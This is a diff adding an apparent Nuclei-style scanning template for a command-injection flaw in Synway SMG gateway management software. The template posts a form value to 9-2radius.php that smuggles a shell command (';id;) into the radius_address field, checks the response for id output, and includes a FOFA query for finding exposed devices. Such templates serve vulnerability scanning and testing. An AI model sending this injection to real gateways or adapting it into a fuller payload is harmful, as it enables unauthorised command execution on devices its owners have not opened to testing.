@@ -1,0 +1,37 @@
+id: synway-9-2radius-rce
+info:
+  name: 杭州三汇网关SMG网关管理软件9-2radius.php命令执行漏洞
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483656&idx=1&sn=8caf4659aacf75e0cbbc693601de0d11&chksm=9606e79aa1716e8c8b0dbe5f0978a58d85fd1c8fb9aff687b7f12396e202c39235f80a45b0ca&cur_album_id=4045056277938913283&scene=189#wechat_redirect
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
+    tips:
+    repair:
+    version:
+  tags: synway,rce
+
+http:
+  - raw:
+      - |
+        POST /en/9-2radius.php?authority=6 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        save=1&enable_radius=1&radius_address=/';id;+#
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
+      - type: status
+        status:
+          - 200
